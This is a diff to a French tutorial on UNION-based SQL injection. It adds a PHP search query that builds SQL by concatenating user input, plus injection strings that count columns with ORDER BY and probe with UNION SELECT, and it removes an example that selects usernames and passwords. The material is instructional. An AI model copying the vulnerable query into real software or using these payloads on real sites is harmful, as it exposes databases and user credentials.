@@ -95,18 +95,32 @@ Malheureusement pour nous, ces genres de vulnérabilités sont extrêmement rare
 
 Une fois une vulnérabilité trouvée, on peut l'exploiter.
 
-#### Les objectifs de cette techniques par commande UNION sont :
+Prenons le cas d'un script vulnérable de recherche d'article à partir d'un mot dans le titre, ce script affiche la liste des articles trouvés et des liens vers ceux-ci. Notre objectif est d'utiliser cette requête pour afficher le contenu d'autres tables.
+
+```php
+$sql="SELECT * FROM article WHERE title LIKE '%" . $title . "%'";
+```
+
+Problème, la structure de la table article nous est inconnue, nous ne connaissons pas ses différents champs; or pour réussir à afficher des informations d'autres tables, plusieurs challenges se posent à nous :
 
 * Trouver le nombre et le type de chaque colonne retournée par la requête
 * Trouver le nom d'une colonne et d'une table comportant des choses intéressantes \(Login, Password, etc.\)
 * Utiliser une union pour récupérer les informations
 
+Trier par numéro de colonne permet de tester si cette colonne existe. Si la requête retourne 5 colonnes ou plus, la requête suivante va fonctionner :
+
 ```sql
-select title, link from post_table
-where id < 10
-union
-select username, password
-from user_table; --;
+SELECT * FROM article WHERE title LIKE '%sql-injection%' ORDER BY 5--'
+```
+
+{% hint style="info" %}
+Remarque,  '--' est utilisé par tous les SGBD pour les commentaires SQL.
+{% endhint %}
+
+Une fois identifié le nombre de colonnes, réalisons une première UNION :
+
+```sql
+SELECT * FROM article WHERE title LIKE '%sql-injection%' UNION SELECT 1,2,3,4,5--'
 ```
 
 {% hint style="info" %}
